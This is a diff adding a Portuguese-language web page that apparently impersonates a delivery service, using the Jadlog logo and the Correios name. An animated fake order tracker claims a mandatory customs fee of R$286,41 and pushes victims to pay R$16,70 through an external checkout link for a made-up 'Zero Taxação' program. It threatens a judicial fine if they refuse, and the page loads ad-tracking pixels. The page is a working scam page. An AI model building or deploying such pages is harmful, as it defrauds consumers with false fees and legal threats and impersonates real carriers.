@@ -1,0 +1,351 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+    
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "683ea64efacfebe4f142f618";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="icon" href="favicon.html" type="./image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon.html">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    
+    <!-- Adicionando a biblioteca animate.css para animações -->
+    <link rel="stylesheet" href="css/animate.min.css">
+    
+    <title>Zero Taxação</title>
+    <style>
+        /* Estilos adicionais para as animações */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #F7BA00;
+            padding-bottom: 10px;
+            padding-left: 10px;
+        }
+        
+        .cart-animation {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .cart-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: red;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .progress-container {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px 0;
+            position: relative;
+        }
+        
+        .progress-item {
+            position: relative;
+            width: 40px;
+            height: 40px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background-color: #ddd;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+        
+        .check-container {
+            width: 40px;
+            height: 40px;
+            background-color: #F7BA00;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .check-container img {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .progress-container p {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* Animação para o cálculo da taxa */
+        .progress-bar2 {
+            width: 100%;
+            height: 10px;
+            background-color: #f3f3f3;
+            margin: 20px 0;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-bar2::after {
+            content: '';
+            display: block;
+            height: 100%;
+            width: 0;
+            background-color: #F7BA00;
+            animation: progress 2s forwards;
+        }
+        
+        @keyframes progress {
+            to { width: 100%; }
+        }
+        
+        /* Animação para o ícone do carrinho */
+        @keyframes cartBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        .material-symbols-outlined.animated {
+            animation: cartBounce 1s infinite;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="content">
+        <nav class="navbar" style="padding-top: 15px;">
+            <div class="menu-icon" style="padding-left: 3%;">
+                <img src="images/logo-jadlog.png" style="height: 5vh;" alt="Logo Central Vivara">
+            </div>
+    
+            <div class="logo-central">
+            </div>
+    
+            <div class="menu-icon" style="padding-right: 3%;">
+                <div class="cart-animation">
+                    <span class="material-symbols-outlined animated" style="font-size: 30px; padding-right: 10px; color: #ffffff">shopping_cart</span>
+                    <div class="cart-badge">1</div>
+                </div>
+            </div>
+        </nav>
+
+        <div class="progress-container">
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar1" style="background-color: rgb(247, 186, 0);"></div>
+            
+                    <div class="check-container" id="check1">
+                        <img src="images/visto.jpg" alt="Animação" id="img1" style="opacity: 1;">
+                    </div>
+                </div>
+
+                <p id="text1">Pedido efetuado</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar2"></div>
+            
+                    <div class="check-container" id="check2">
+                        <img src="images/visto.jpg" alt="Animação" id="img2" style="opacity: 0;">
+                    </div>
+                </div>
+                
+                <p id="text2">Em separação</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar3"></div>
+            
+                    <div class="check-container" id="check3">
+                        <img src="images/visto.jpg" alt="Animação" id="img3" style="opacity: 0;">
+                    </div>
+                </div>
+                
+                <p id="text3">Envio</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar4"></div>
+            
+                    <div class="check-container" id="check4">
+                        <img src="images/visto.jpg" alt="Animação" id="img4" style="opacity: 0;">
+                    </div>
+                </div>
+                
+                <p id="text4">Entrega</p>
+            </div>
+        </div>
+
+        <section id="more-information">
+            <h1>ATENÇÃO!</h1>
+
+            <h2>Foi encontrada uma pendência</h2>
+
+            <p>
+                O produto que você selecionou é importado e durante o processo de separação e envio foi identificada uma
+                <span class="bold">taxa obrigatória de desembaraço aduaneiro</span>.
+            </p>
+
+            <p>Clique no botão abaixo para calcular a taxa.</p>
+
+            <button id="show-offer" disabled="">CALCULAR TAXA</button>
+        </section>
+    </div>
+
+    <div id="offer-modal" class="modal">
+        <div class="modal-content">
+
+            <div id="step1">
+                <h1>Calculando sua taxa</h1>
+
+                <div id="trace" class="progress-bar2"></div>
+
+                <p>Por favor aguarde...</p>
+            </div>
+
+            <div id="step2">
+                <p>VALOR DA TAXA DE IMPORTAÇÃO:</p>
+
+                <span id="value">R$ 286,41</span>
+
+                <p>Mas você tem uma boa notícia: o <span class="bold2">Correios</span> oferece a opção de assumir <span class="bold2">total responsabilidade</span> sobre essa taxa no programa.</p>
+
+                <h1>ZERO TAXAÇÃO</h1>
+
+                <p>se inscreva por apenas</p>
+
+                <h1 id="value">R$ 16,70 </h1>
+
+                <a href="https://checkout.bullspay.com.br/H5UF3k00Oa">LIBERAR ENTREGA</a>
+
+                <p>Atenção: Caso você não pague os <br><span class="bold3">R$16,70</span>, a taxa de <span class="bold4">R$286,41</span> será cobrada <br>de você, conforme exigido por lei. O descumprimento dessa lei acarretará em <span class="bold4">multa judicial</span>.</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/scripts.js"></script>
+    
+    <script>
+        // Animação do progresso do pedido - VERSÃO COM VISTO.jpg
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configura todas as imagens para usar visto.jpg
+            const checkImages = document.querySelectorAll('.check-container img');
+            checkImages.forEach(img => {
+                img.src = 'images/visto.jpg'; // Força o uso do visto.png
+                img.style.opacity = '0';
+                Object.defineProperty(img, 'src', { // Trava a propriedade
+                    writable: false,
+                    configurable: false
+                });
+            });
+    
+            // Ativar o primeiro estágio
+            setTimeout(() => {
+                const img1 = document.getElementById('img1');
+                img1.style.opacity = '1';
+                document.getElementById('bar1').style.backgroundColor = '#F7BA00';
+            }, 500);
+            
+            // Segundo estágio
+            setTimeout(() => {
+                const img2 = document.getElementById('img2');
+                img2.style.opacity = '1';
+                document.getElementById('bar2').style.backgroundColor = '#F7BA00';
+                document.getElementById('text2').style.fontWeight = 'bold';
+                document.getElementById('text2').style.color = '#000';
+                animatePreparation();
+            }, 2000);
+            
+            // Terceiro estágio
+            setTimeout(() => {
+                const img3 = document.getElementById('img3');
+                img3.style.opacity = '1';
+                document.getElementById('bar3').style.backgroundColor = '#F7BA00';
+                document.getElementById('text3').style.fontWeight = 'bold';
+                document.getElementById('text3').style.color = '#000';
+            }, 4000);
+            
+            // Quarto estágio (sem imagem)
+            setTimeout(() => {
+                document.getElementById('text4').style.fontWeight = 'bold';
+                document.getElementById('text4').style.color = '#000';
+                const btn = document.getElementById('show-offer');
+                btn.disabled = false;
+                btn.classList.add('animate__animated', 'animate__pulse', 'animate__infinite');
+            }, 6000);
+            
+            // Modal
+            document.getElementById('show-offer').addEventListener('click', () => {
+                document.getElementById('offer-modal').style.display = 'block';
+                document.getElementById('step1').style.display = 'block';
+                document.getElementById('step2').style.display = 'none';
+                
+                setTimeout(() => {
+                    document.getElementById('step1').style.display = 'none';
+                    const step2 = document.getElementById('step2');
+                    step2.style.display = 'block';
+                    step2.classList.add('animate__animated', 'animate__fadeIn');
+                }, 2000);
+            });
+        });
+    
+        function animatePreparation() {
+            const preparationText = document.getElementById('text2');
+            let dots = 0;
+            const originalText = preparationText.textContent;
+            
+            const interval = setInterval(() => {
+                dots = (dots + 1) % 4;
+                preparationText.textContent = originalText + '.'.repeat(dots);
+            }, 500);
+            
+            setTimeout(() => {
+                clearInterval(interval);
+                preparationText.textContent = originalText;
+            }, 2000);
+        }
+    </script>
+
+</body></html>
